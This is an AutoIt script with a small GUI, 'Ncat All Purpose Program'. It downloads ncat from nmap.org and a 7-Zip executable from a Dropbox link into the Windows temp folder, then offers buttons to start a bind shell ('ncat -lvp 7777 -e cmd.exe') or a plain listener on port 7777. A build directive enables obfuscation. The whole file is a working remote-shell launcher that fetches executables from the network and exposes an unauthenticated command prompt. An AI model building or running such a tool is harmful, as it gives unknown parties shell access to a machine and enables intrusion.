#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Add_Constants=n
#AutoIt3Wrapper_Run_Obfuscator=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <TabConstants.au3>
#include <WindowsConstants.au3>


#Region ### Start Variables Region ###
$tempDir = @WindowsDir & "\temp"

#EndRegion


; Initialization
if FileExists($tempDir & "\ncat.zip") Then

Else
	InetGet("http://nmap.org/dist/ncat-portable-5.59BETA1.zip",$tempDir & "\ncat.zip", 1, 0)
EndIf
if FileExists($tempDir & "\7z.exe") Then
Else
	InetGet("https://dl.dropboxusercontent.com/s/drog5kn8w74ukrp/7za.exe?token_hash=AAHMxn_smUBBQD5USYZo_b9o6pIP8dLAsg5yPFUUesAYVQ&dl=1",$tempDir & "\7z.exe", 1, 0)
EndIf
if FileExists($tempDir & "\ncat.exe") Then

Else
	ShellExecute ($tempDir & "\7z.exe", "e -y ncat.zip", $tempDir)
EndIf
; End Initialization
#Region ### START Koda GUI section ###
$MainForm = GUICreate("Ncat All Purpose Program", 303, 144, 344, 260)
$Tab1 = GUICtrlCreateTab(8, 0, 289, 137)
$Ncat_shell = GUICtrlCreateTabItem("Ncat Windows Cmd Shell")
$NShellStart = GUICtrlCreateButton("Start", 12, 29, 131, 73)
GUICtrlSetFont(-1, 8, 400, 0, "Arial")
$NShellStop = GUICtrlCreateButton("Stop", 148, 29, 139, 73)
GUICtrlSetFont(-1, 8, 400, 0, "Arial")
$clrFiles = GUICtrlCreateButton("Clear Files", 16, 104, 267, 25)
GUICtrlSetFont(-1, 8, 400, 0, "Arial")
$TabSheet2 = GUICtrlCreateTabItem("Ncat Listening Shell")
$NRShellStart = GUICtrlCreateButton("Start", 12, 29, 129, 65)
GUICtrlSetFont(-1, 8, 400, 0, "Arial")
$NRShellStop = GUICtrlCreateButton("Stop", 148, 29, 131, 65)
GUICtrlSetFont(-1, 8, 400, 0, "Arial")
GUICtrlCreateTabItem("")
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###






While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit

	EndSwitch

	Select
		Case $nMsg = $NShellStart
			ShellExecute($tempDir & "\ncat.exe" , " -lvp 7777 -e cmd.exe", "c:\")
		Case $nMsg = $NShellStop
			ProcessClose( "ncat.exe")
		Case $nMsg = $NRShellStart
			ShellExecute( $tempDir & "\ncat.exe", "-lvp 7777", "c:\")
		Case $nMsg = $NRShellStop
			ProcessClose( "ncat.exe")
		Case $nMsg = $clrFiles
			FileDelete($tempDir & "\ncat.exe")
			FileDelete($tempDir & "\ncat.zip")
			FileDelete($tempDir & "\7z.exe")

	EndSelect
WEnd



